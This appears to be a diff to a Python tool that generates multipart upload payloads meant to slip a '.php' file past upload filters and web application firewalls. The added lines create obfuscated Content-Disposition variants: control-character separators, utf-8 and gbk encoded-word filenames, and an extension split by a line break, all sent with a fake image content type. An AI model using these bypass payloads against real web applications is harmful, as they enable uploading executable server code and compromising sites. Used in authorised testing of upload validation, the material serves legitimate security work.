@@ -14,7 +14,7 @@ import base64, pyperclip
 suffix = b'php'
 filename = b'xx'
 name = b'upfile'
-boundary = b'------WebKitFormBoundarycgmgzUODd5a28X52'
+boundary = b'------------------------42cef8877054958f'
 Content_Type = b'image/jpeg'
 content = b'123456'
 ##################################################################################################
@@ -40,9 +40,22 @@ def generate(Content_Type1 = b'''Content-Type: multipart/form-data; boundary='''
 def generate_other(body = b''):
     
     return base64.b64encode(body)
+
+def utf8_encode(string):
+    return(b"=?utf-8?B?"+ base64.b64encode(string) +b"?=")
+
+def gbk_encode(string):
+    res = ""
+    for i in string.decode("gbk"):
+        tmp = hex(ord(i)).split("0x")[1]
+        res += f"={tmp}"
+    return ("=?gbk?Q?"+res+"?=").encode('utf8')
 ##################################################################################################
 payloads = []
 Content_Disposition_list = [b'''Content-Disposition: form-data; name="''' + name + b'''"; filename="''' + filename + b'''.''' + suffix[:1] + b'''\r\n''' + suffix[1:] + b'''"''',
+b'''Content-Disposition: "form-data"; name="''' + name + b'''"; \x1cfilename\x1c="''' + filename + b'''.''' + suffix + b'''"''',
+b'''Content-Disposition: "form-data"; name="''' + utf8_encode(name) + b'''"; filename="''' + utf8_encode(filename + b'''.''' + suffix) + b'''"''',
+b'''Content-Disposition: "form-data"; name="''' + gbk_encode(name) + b'''"; filename="''' + gbk_encode(filename + b'''.''' + suffix) + b'''"''',
 b'''Content-Disposition: "form-data"; name=\'''' + name + b'''; filename=\'''' + filename + b'''.''' + suffix + b'''; name=\'''' + name + b'''\'''',
 b'''Content-Disposition: "form-data"; name="''' + name + b'''\\"; filename="''' + filename + b'''.''' + suffix + b'''; name="''' + name + b'''"''',
 b'''Content-Disposition: "form-data"; name="''' + name + b'''"a"; filename="''' + filename + b'''.''' + suffix + b'''"''',
